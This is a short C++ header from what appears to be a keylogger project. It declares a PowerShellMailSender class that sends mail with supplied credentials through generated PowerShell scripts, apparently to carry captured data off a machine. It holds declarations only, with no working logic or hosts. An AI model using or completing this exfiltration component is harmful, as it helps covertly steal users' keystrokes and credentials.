#pragma once

#include "MailSender.h"
#include "PowerShellSendMailScriptCreator.h"

namespace keylogger::mail
{
class PowerShellMailSender : public MailSender
{
public:
    PowerShellMailSender(std::unique_ptr<PowerShellSendMailScriptCreator>);

    bool sendMail(const Mail&, const Credentials&) override;

private:
    std::unique_ptr<PowerShellSendMailScriptCreator> scriptCreator;
};
}
